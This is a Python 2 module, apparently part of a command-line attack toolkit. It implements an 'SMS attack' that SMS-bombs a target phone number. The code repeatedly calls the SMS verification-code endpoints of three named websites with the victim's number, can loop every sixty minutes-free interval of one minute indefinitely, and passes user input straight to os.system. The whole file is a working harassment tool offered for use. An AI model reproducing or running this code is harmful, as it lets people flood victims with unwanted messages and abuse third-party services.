#!/usr/bin/env python
# encoding:utf-8
# SMS Attack Modules
# Created 8/28
import requests
from core import help
from comm import *
from time import sleep

options = ["10086",'false']

def sms_attack():

    ksf_1 = ksf_line('Exp Sms')
    com   = raw_input(ksf_1)

    try:
        if com[0:10] == 'set TARGET':
            target  = com[11:]
            options[0] = target
            print tag_true + "set TARGET --> " + options[0] 
            sms_attack()
        elif com[0:8] == 'set LOOP':
            loop = com[9:]
            options[1] = loop
            print tag_true + "set LOOP --> " + options[1] 
            sms_attack()
        elif com[0:12] == 'show options':
            show_op()
            print "TARGET\t\t" + options[0] + "\t\t Target's Number " 
            print "LOOP\t\t"   + options[1] + "\t\t Loop send message" 
            sms_attack()
        elif com[0:1] == '!':
            os.system(com[1:])
            sms_attack()
        elif com[0:4] == 'help':
            help.help()
            sms_attack()
        elif com[0:4] == 'back':
            pass
        elif com[0:4] == 'exit':
            exit(0)
        elif com[0:3] == 'run' or com[0:7] == 'expoloit':

            headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:19.0)\
                 Gecko/10100101 Firefox/19.0'}
            url_l = ["http://member.ync365.com/check/getcode?mobile=" + options[0],
                 "http://www.yunjiazheng.com/member/SendDynamicPassword?mobile="+options[0],
                 "http://user.rayli.com.cn/forum.php?mod=ajax&infloat=register&handlekey=register&action=dsmscode&fbry=15636xAab1223awWC45763&ajaxmenu=1&stype=lostpwd&mobile=" + options[0] + "&inajax=1&ajaxtarget=smscode_tip"
                 ]
            try:
                while True:
                    for url in url_l:
                        try:
                            r = requests.get(url,headers=headers)
                            print '[*] using ' + url + '...' 
                            print '[*] Try send  a messages ' + 'to ' + options[0] 
                        except:
                            print "send error please your network" 
                    if options[1] != 'true':
                        break
                    print "[*] 等待一分钟..." 
                    sleep(60)
            except KeyboardInterrupt:
                print_err("[!] Detected Ctrl-C...")
                sql_exp()

            sql_exp()
        else:
            sql_exp()

    except KeyboardInterrupt:
         print_err("[*] Detected Ctrl-C ,System Exit...")

